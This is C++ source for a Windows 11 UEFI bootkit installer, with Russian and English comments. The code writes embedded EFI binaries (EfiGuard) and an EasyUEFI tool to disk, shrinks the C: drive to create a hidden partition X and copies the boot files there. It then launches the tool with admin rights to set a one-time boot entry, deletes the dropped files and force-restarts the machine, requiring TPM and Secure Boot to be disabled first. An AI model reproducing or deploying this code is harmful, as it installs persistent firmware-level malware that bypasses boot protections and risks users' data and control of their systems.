/*
- используйте директиву #ifdef для отладочных сообщений я просто закомментировал их для релиза
*/

#include <iostream>
#include <Windows.h>
#include <string>
#include <vector>
#include <fstream>

#include "global.h"


// Главная 7.1.2024
bool dropBytes() {
    std::string TempDir = systemUtil::GetTempDirectory();

    if (!diskUtil::writeFileBytes("C:\\bootx64.efi", bootx64Raw, sizeof(bootx64Raw)))
        return false;

    if (!diskUtil::writeFileBytes("C:\\EfiGuardDxe.efi", EfiGuardDxeRaw, sizeof(EfiGuardDxeRaw)))
        return false;

    std::string KernelUefiPath = TempDir + "\\kernelUefi.exe";
    if (!diskUtil::writeFileBytes(KernelUefiPath, EasyUEFCIRaw, sizeof(EasyUEFCIRaw)))
        return false;

    std::string intlDllPath = TempDir + "\\intl.dll";
    if (!diskUtil::writeFileBytes(intlDllPath, intlRaw, sizeof(intlRaw)))
        return false;

    std::string libcurlDllPath = TempDir + "\\libcurl.dll";
    if (!diskUtil::writeFileBytes(libcurlDllPath, libcurlRaw, sizeof(libcurlRaw)))
        return false;

    return true;
}

bool SetBootEntry() {
    /* I need to make a checking system/sdk for EasyUEFI as all this does is (hope) the next index is EfiGuard, If not it breaks. */
    std::string TempDir = systemUtil::GetTempDirectory();
    std::string KernelUefiPath = TempDir + "\\kernelUefi.exe";
    if (systemUtil::RunAsAdmin(KernelUefiPath, "--one-time-boot --index 1")) {
        // std::cout << "Executable launched successfully with admin privileges." << std::endl;
    }
    else {
        // std::cout << "Failed to launch executable with admin privileges." << std::endl;
    }
    Sleep(2000);
    std::remove("C:\\bootx64.efi");
    std::remove("C:\\EfiGuardDxe.efi");
    MessageBoxA(NULL, "Boot Record overwritten\nRestart your computer and check if BootKit Loads.", "", MB_OK | MB_ICONINFORMATION);
    systemUtil::ForceRestart();
    return 0;
}

int main() {
    std::string partitionName = "X"; // Assume the partition will be assigned the drive letter X
    std::vector<std::pair<std::string, std::string>> files = {
{"C:\\bootx64.efi", partitionName + ":\\EFI\\Boot\\bootx64.efi"},
{"C:\\EfiGuardDxe.efi", partitionName + ":\\EFI\\Boot\\EfiGuardDxe.efi"}
    };

	if (systemUtil::GetWindowsVersion() != 11) { // последний буткит поддерживается только в 11
		MessageBoxA(NULL, "This Windows Version is Not Supported.", "", MB_OK | MB_ICONINFORMATION);
		return 1;
	}
	if (systemUtil::IsTPMEnabled()) { // это требуется отключить ТПМ для запуска
		MessageBoxA(NULL, "Please Disable TPM Before Running...", "", MB_OK | MB_ICONINFORMATION);
		return 1;
	}
	if (systemUtil::IsSecureBootEnabled()) { // для запуска необходимо отключить Безопасную загрузку
		MessageBoxA(NULL, "Please Disable Secure Boot Before Running...", "", MB_OK | MB_ICONINFORMATION);
		return 1;
	}

    if (!diskUtil::PartitionExists(partitionName)) {
        /* Partition Does Not Exist */
        diskUtil::CreatePartition(partitionName);
        if (!(diskUtil::PartitionExists("X"))) {
            diskUtil::ShrinkPartition("C", 50);
            diskUtil::CreatePartition(partitionName);
        }
        systemUtil::CopyFiles(files);
        MessageBoxA(NULL, "EFI Bootkit disk created, Please restart and re-run the program/bootkit.", "", MB_OK | MB_ICONINFORMATION);
        systemUtil::ForceRestart();
        return 1;
    }
    else {
        /* Partition Does Exist */
        if (diskUtil::getPartitionSizeInMB(partitionName) > 100) {
            MessageBoxA(NULL, "Please Delete/Remove Partition ( X: ) Then Re-Run.", "", MB_OK | MB_ICONINFORMATION);
            return 1;
        }
        else {
            /* Partition Exists and is EfiGuard */
            SetBootEntry();
        }
    }
    return 0;
}